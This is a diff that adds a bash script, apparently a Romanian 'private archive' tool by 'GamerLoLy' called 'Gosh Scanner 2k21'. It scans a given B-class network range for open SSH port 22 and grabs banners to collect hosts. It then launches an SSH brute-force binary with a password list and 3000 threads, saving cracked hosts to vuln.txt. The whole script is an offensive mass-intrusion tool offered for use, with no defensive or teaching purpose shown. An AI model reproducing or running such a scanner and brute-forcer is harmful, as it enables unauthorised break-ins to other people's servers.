@@ -1,0 +1,64 @@
+#!/bin/bash
+##################################################
+#                   Arhiva Mix                   # 
+#                   2017«»2018                   #
+##################################################
+#          Arhiva privata by GamerLoLy™          #
+##################################################
+
+
+
+if [ $# != 1 ]; then
+        echo " usage: $0 <b class>"
+        exit;
+fi
+rm -rf scan.log
+BLK='[1;30m'
+RED='[1;31m'
+GRN='[1;32m'
+YEL='[1;33m'
+BLU='[1;34m'
+MAG='[1;35m'
+CYN='[1;36m'
+WHI='[1;37m'
+DRED='[0;31m'
+DGRN='[0;32m'
+DYEL='[0;33m'
+DBLU='[0;34m'
+DMAG='[0;35m'
+DCYN='[0;36m'
+DWHI='[0;37m'
+RES='[0m'
+####################################
+passfile=pass
+threads=3000
+port=22
+####################################
+
+echo ""
+echo "${DRED} Start Gosh Scanner 2k21"
+./Ele $port -a $1 -i eth0 -s 10
+echo "${WHI}[${GRN}Portscan${WHI}] -"
+sleep 2
+pkill Ele
+echo ""
+echo "${DBLU} Start Banner (wait for finish)"
+./banner bios.txt 22 500
+echo ""
+sleep 2
+cat banner.log |awk '{print $6}' > scan.log
+pkill banner
+echo ""
+echo "        ${DWHI}Te iubesc ${DRED}♥ ${DYEL}Elena ${DRED}♥   ${WHI}◄ ${DRED}▬ ${DGRN}Scan Mix ${DRED}▬ ${WHI}► ${DWHI} Scanam pentru ${DYEL}GamerLoLy${RED}"
+echo ""
+echo "${DRED} Start BruteForce"
+echo ""
+rm -rf banner.log
+rm -rf bios.txt
+./Elena scan.log $passfile 10 3 $threads vuln.txt $port
+sleep 5
+pkill Elena
+
+echo ""
+echo "${DYEL}[${DRED}•${DWHI}] ${DWHI}Am terminat de scanat ${DYEL}[${DRED}•${DYEL}] ${WHI}"
+echo ""
